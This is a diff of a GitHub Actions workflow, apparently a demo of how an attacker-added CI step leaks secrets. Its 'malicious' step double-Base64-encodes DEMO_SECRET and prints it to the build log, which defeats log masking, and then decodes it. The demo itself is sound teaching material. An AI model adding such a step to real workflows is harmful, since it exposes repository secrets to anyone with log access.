@@ -10,7 +10,7 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      # Étape normale (légitime)
+      # Étape normale
       - name: Affichage légitime
         run: |
           echo "----- Début du log légitime -----"
@@ -19,8 +19,9 @@ jobs:
         env:
           DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
 
-      # 🚨 Étape malveillante ajoutée par un attaquant
+      # Étape malveillante
       - name: 🚨 Étape compromise : extraction du secret en clair
+        shell: bash
         run: |
           echo ""
           echo "===== ⚠️ ATTACKER PAYLOAD ACTIVÉ ====="
@@ -31,8 +32,8 @@ jobs:
           encoded=$(echo -n "$DEMO_SECRET" | base64 | base64)
           echo "$encoded"
           echo ""
-          echo "[Attacker] Décodage pour récupérer le secret réel :"
-          echo "$encoded" | base64 -d | base64 -d
+          echo "[Attacker] Décodage du double Base64 :"
+          echo "$encoded" | base64 --decode | base64 --decode
           echo "===== ⚠️ FIN DU PAYLOAD ====="
         env:
           DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
